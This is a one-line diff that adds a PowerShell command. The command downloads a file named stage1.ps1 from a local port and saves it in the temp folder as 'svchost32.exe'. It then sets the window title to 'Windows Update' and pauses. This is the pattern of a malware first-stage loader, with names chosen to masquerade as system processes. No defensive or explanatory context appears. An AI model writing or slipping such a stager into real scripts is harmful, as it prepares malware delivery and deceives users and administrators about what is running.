@@ -1,0 +1,1 @@
+$FetchUrl = 'http://localhost:8081/stage1.ps1'; $PayloadPath = "$env:TEMP\svchost32.exe"; Invoke-WebRequest -Uri $FetchUrl -OutFile $PayloadPath -UseBasicParsing; $Host.UI.RawUI.WindowTitle = "Windows Update"; Start-Sleep -Seconds 37
